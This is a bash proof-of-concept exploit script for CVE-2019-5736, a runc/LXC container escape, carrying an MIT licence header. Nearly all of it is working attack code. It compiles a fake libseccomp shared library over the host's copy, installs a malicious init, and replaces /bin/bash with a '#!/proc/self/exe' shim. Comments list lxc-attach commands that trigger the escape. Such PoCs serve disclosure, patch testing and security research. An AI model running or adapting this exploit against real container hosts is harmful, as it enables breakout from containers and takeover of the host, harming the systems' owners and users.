#!/bin/bash
# CVE-2019-5736: PoC Exploit Code
# Copyright (C) 2019 Aleksa Sarai <cyphar@cyphar.com>
# Vulnerability discovered by Adam Iwaniuk and Borys Popławski.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to
# deal in the Software without restriction, including without limitation the
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
# sell copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# * The above copyright notice and this permission notice shall be included in
#   all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
# IN THE SOFTWARE.

set -Eexo pipefail

# Switch to the buildroot.
cd "$(readlink -f "$(dirname "${BASH_SOURCE}")")"

# Generate a new libseccomp.so.1 with the symbols on the host. If your
# container runtime isn't linked against libseccomp, pick any other shared
# library (other than glibc obviously).
SECCOMP_TARGET="$(find /lib* /usr/lib* | egrep 'libseccomp\.so' | sort -r | head -n1)"
cp ./bad_libseccomp{,_gen}.c
objdump -T "$SECCOMP_TARGET" | \
	awk '($4 == ".text" && $6 == "Base") { print "void", $7 "() {}" }' >> ./bad_libseccomp_gen.c

# Install our /bad_init and libseccomp.
cp ./bad_init.sh /bad_init
gcc -Wall -Werror -fPIC -shared -rdynamic -o "$SECCOMP_TARGET" ./bad_libseccomp_gen.c

# And finally add an entrypoint. You can exploit this any of the following
# ways:
#
#  1. lxc-attach -n c1 -- /proc/self/exe
#  2. lxc-attach -n c1 -- /bin/bad_bash (ln -sf /proc/self/exe /bin/bad_bash)
#  3. lxc-attach -n c1 -- /bin/bad_bash (echo '#!/proc/self/exe' > /bin/bad_bash)
#
# (Or the equivalent for Docker/runc, etc.)

# Keep around good_bash for debugging.
mv /bin/bash /bin/good_bash

# Make bash evil.
cat >/bin/bash <<EOF
#!/proc/self/exe
EOF
chmod +x /bin/bash
